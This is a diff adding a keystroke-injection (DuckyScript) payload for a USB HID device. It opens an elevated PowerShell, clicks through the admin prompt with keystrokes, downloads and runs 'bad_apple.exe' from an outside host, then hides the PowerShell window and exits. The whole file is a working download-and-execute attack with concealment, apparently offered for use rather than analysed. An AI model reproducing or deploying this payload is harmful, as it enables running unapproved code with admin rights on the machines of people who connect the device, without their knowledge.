@@ -1,0 +1,15 @@
+DELAY 200
+GUI r
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 1000
+LEFTARROW
+DELAY 500
+ENTER
+DELAY 1000
+STRING $down = New-Object System.Net.Webclient; $url = 'https://mon.im/bad_apple.exe'; $file = 'bad_apple.exe'; $down.DownloadFile($url,$file)
+ENTER
+DELAY 500
+STRING $file="bad_apple.exe";$exec=New-Object -ComObject Shell.Application;$exec.ShellExecute($file);$hwnd=(Get-Process -Id $PID).MainWindowHandle;Add-Type -TypeDefinition "using System; using System.Runtime.InteropServices; public class WinAPI { [DllImport(`"user32.dll`")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); }"; [WinAPI]::ShowWindow($hwnd,0); exit
+ENTER
